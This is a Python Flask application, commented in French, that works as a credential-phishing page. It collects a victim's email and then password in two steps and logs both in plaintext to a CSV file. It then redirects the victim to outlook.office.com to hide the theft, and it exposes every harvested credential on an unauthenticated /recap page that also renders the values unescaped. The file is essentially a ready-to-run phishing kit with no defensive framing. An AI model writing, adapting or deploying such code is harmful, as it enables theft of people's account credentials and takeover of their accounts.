from flask import Flask, request, render_template, redirect, session
import csv
import os
from datetime import datetime

app = Flask(__name__)
app.secret_key = "ceci_est_une_clé_secrète_à_modifier"

LOG_FILE = "log.csv"

# Crée le fichier si nécessaire
if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, mode="w", newline="", encoding="utf-8") as file:
        writer = csv.writer(file)
        writer.writerow(["Horodatage", "Email", "Mot de passe"])

@app.route("/", methods=["GET"])
def home():
    return render_template("index.html")

@app.route("/log", methods=["POST"])
def step1():
    email = request.form.get("email")
    timestamp = datetime.now().isoformat(timespec='seconds')

    session["email"] = email
    session["timestamp"] = timestamp

    with open(LOG_FILE, mode="a", newline="", encoding="utf-8") as file:
        writer = csv.writer(file)
        writer.writerow([timestamp, email, ""])

    return render_template("password.html", email=email)

@app.route("/final", methods=["POST"])
def step2():
    email = session.get("email", "non_renseigné")
    timestamp = session.get("timestamp")
    password = request.form.get("password")

    rows = []
    with open(LOG_FILE, mode="r", encoding="utf-8") as file:
        reader = csv.reader(file)
        rows = list(reader)

    for i in range(1, len(rows)):
        if rows[i][0] == timestamp and rows[i][1] == email and rows[i][2] == "":
            rows[i][2] = password
            break

    with open(LOG_FILE, mode="w", newline="", encoding="utf-8") as file:
        writer = csv.writer(file)
        writer.writerows(rows)

    session.clear()
    return redirect("https://outlook.office.com")

@app.route("/recap", methods=["GET"])
def recap():
    rows = []
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, mode="r", encoding="utf-8") as file:
            reader = csv.reader(file)
            next(reader)
            rows = list(reader)

    table_html = "<h2>Récapitulatif des tentatives</h2><table border='1'><tr><th>Horodatage</th><th>Email</th><th>Mot de passe</th></tr>"
    for row in rows:
        table_html += "<tr>" + "".join(f"<td>{cell}</td>" for cell in row) + "</tr>"
    table_html += "</table>"
    return table_html

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
